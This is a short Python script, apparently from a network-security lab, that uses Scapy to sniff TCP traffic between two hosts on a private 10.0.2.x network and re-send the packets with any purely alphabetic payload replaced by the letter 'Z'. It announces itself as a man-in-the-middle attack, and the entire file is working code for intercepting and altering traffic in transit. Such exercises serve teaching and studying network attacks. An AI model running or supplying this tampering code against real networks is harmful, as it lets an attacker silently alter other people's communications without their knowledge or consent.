from scapy.all import *
print("*****************MITM attack starts*****************")
def spoof_pkt(pkt):
    if pkt[IP].src=="10.0.2.6" and pkt[IP].dst=="10.0.2.5":
        IPLayer=IP(src=pkt[IP].src,dst=pkt[IP].dst)
        TCPLayer=TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack)
        if str(pkt[TCP].payload).isalpha():
            Data="Z"
            newpkt=IPLayer/TCPLayer/Data
        else:
            newpkt=pkt[IP]
        send(newpkt,verbose=0)
        print("Packet sent")
    elif pkt[IP].src=="10.0.2.5" and pkt[IP].dst=="10.0.2.6":
        IPLayer=IP(src=pkt[IP].src,dst=pkt[IP].dst)
        TCPLayer=TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack)
        if str(pkt[TCP].payload).isalpha():
            Data="Z"
            newpkt=IPLayer/TCPLayer/Data
        else:
            newpkt=pkt[IP]
        send(newpkt,verbose=0)
        print("Packet sent")

pkt=sniff(filter="tcp and (ether src 08:00:27:75:e3:fb or ether src 08:00:27:dc:ca:58)",prn=spoof_pkt)